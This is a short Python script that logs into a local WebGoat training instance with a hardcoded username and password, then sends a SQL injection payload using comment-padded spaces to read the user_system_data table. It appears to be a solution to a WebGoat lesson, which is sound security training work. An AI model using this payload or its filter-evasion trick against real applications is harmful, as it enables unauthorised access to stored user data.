import requests
from bs4 import BeautifulSoup

# Define the base URL
base_url = 'http://127.0.0.1:8080/WebGoat/'
login_url = f'{base_url}login'

# Create a session to persist cookies across requests
session = requests.Session()

# Retrieve the login page content and parse it to extract hidden fields
response = session.get(login_url)
soup = BeautifulSoup(response.text, 'html.parser')
hidden_fields = soup.find_all('input', {'type': 'hidden'})
form_data = {field['name']: field.get('value', '') for field in hidden_fields}

# Define the user credentials
credentials = {
    'username': 'sbombatkar',
    'password': 'Sneha#1234',
    **{hidden_field['name']: hidden_field.get('value', '') for hidden_field in hidden_fields}
}

# Submit the login details to authenticate
response = session.post(login_url, data=credentials)

# Check if the login is successful
if 'Invalid username and password' not in response.text:
    print("Login Successful!")
else:
    print("Failed to Login.")
    
# Define the vulnerable endpoint for sql injection attack
vulnerable_endpoint = f"{base_url}start.mvc?username=sbombatkar#lesson/SqlInjectionMitigations.lesson/8"

# Create a payload for the SQL injection attack
payload = "cyber';/**/select/**/*/**/from/**/user_system_data;--"

# Submit the SQL injection payload to the vulnerable endpoint
response = session.get(vulnerable_endpoint, params={'Name': payload})

# Check if the attack was successful by looking for specific keywords in the response
if 'You have succeeded' in response.text:
    print("SQL Injection Attack Successful!")
else:
    print("Failed to inject SQL.")